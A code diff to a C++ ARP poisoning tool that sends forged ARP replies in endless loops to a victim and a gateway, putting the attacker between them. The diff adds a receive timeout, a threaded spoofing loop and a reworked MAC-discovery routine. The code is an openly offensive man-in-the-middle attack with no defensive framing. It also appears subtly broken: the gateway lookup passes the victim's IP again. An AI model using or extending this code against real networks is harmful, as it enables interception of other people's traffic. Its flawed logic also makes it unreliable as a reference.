@@ -67,12 +67,18 @@ void broadcast_packet(
     GUARD(bytes_send > 0, "failed to broadcast packet");
 }
 
-MACAddress get_victim_response(int fd, const IPv4Address& victim_ip_addr){
+MACAddress get_victim_mac_address(
+    int fd, struct sockaddr_ll* device, 
+    const MACAddress& src_mac_addr, const IPv4Address& spoofed_ip_addr, const IPv4Address& victim_ip_addr
+){
     static uint8_t buffer[1500];
 
     while(true) {
+        broadcast_packet(fd, device, src_mac_addr, spoofed_ip_addr, victim_ip_addr);
         int bytes_read = recvfrom(fd, buffer, 1500, 0, NULL, NULL);
-        GUARD(bytes_read > 0, "failed to read from socket");
+        printf("Bytes Read: %d\n", bytes_read);
+        // GUARD(bytes_read >= 0, "failed to read from socket");
+        if(bytes_read <= 0) continue;
         
         printf("Frame: ");
         debug_buffer(buffer);
@@ -103,19 +109,20 @@ MACAddress get_victim_response(int fd, const IPv4Address& victim_ip_addr){
 
 void send_to_victim(
     int fd, struct sockaddr_ll* device, int repeat_delay,
-    MACAddress src_mac_addr, IPv4Address spoofed_ip_addr, 
-    MACAddress victim_mac_addr, IPv4Address victim_ip_addr
+    const MACAddress& src_mac_addr, const IPv4Address& spoofed_ip_addr, 
+    const MACAddress& victim_mac_addr, const IPv4Address& victim_ip_addr
 ){
     ARPPacket arp = ARPPacket(ARP_REPLY, src_mac_addr, spoofed_ip_addr, victim_mac_addr, victim_ip_addr);
     EthernetFrame eth = EthernetFrame(victim_mac_addr, src_mac_addr, ETHTYPE_ARP);
 
-    static uint8_t buffer[1500];  
+    uint8_t buffer[1500];  
     write(buffer, eth, arp);
 
     while(true){
         int bytes_send = sendto(fd, buffer, ETH_HEADER_LEN + ARP_PACKET_LEN, 0, (const struct sockaddr*)device, sizeof(*device));
         GUARD(bytes_send > 0, "failed to send data on socket");
-        printf("[+] Spoofed ARP Packet sent\n");
+        printf("[+] Spoofed ARP Packet sent to: ");
+        print(victim_ip_addr);
         sleep(repeat_delay);
     }
 
@@ -172,6 +179,13 @@ int main(int argc, char** argv){
     int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     GUARD(fd != -1, "failed to create socket");
 
+    struct timeval tv;
+    tv.tv_sec = 1;
+    tv.tv_usec = 0;
+    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
+
+
+
     MACAddress src_mac_addr = get_hardware_address(fd, interface);
     printf("Source MAC Address: ");
     print(src_mac_addr);
@@ -181,23 +195,25 @@ int main(int argc, char** argv){
 
     printf("Starting ARP Poisoning\n");
 
-    broadcast_packet(fd, &device, src_mac_addr, gateway_ip, victim_ip);
-    MACAddress victim_mac_addr = get_victim_response(fd, victim_ip);
+    MACAddress victim_mac_addr = get_victim_mac_address(fd, &device, src_mac_addr, gateway_ip, victim_ip);
     printf("Victim MAC Address: ");
     print(victim_mac_addr);
     
     std::thread victim_thread{
-        [](){
+        [&](){
             send_to_victim(fd, &device, SPOOFED_SEND_DELAY, src_mac_addr, gateway_ip, victim_mac_addr, victim_ip);
         }
-    }
+    };
     
-    broadcast_packet(fd, &device, src_mac_addr, victim_ip, gateway_ip);
-    MACAddress gateway_mac_addr = get_victim_response(fd, gateway_ip);
+
+    MACAddress gateway_mac_addr = get_victim_mac_address(fd, &device, src_mac_addr, gateway_ip, victim_ip);
     printf("Gateway MAC Address: ");
     print(gateway_mac_addr);
-    send_to_victim(fd, &device, SPOOFED_SEND_DELAY, src_mac_addr, gateway_ip, victim_mac_addr, victim_ip);
+
+    send_to_victim(fd, &device, SPOOFED_SEND_DELAY, src_mac_addr, victim_ip, gateway_mac_addr, gateway_ip);
     
+
+    victim_thread.join();
     // close(fd);
     return 0;
 }
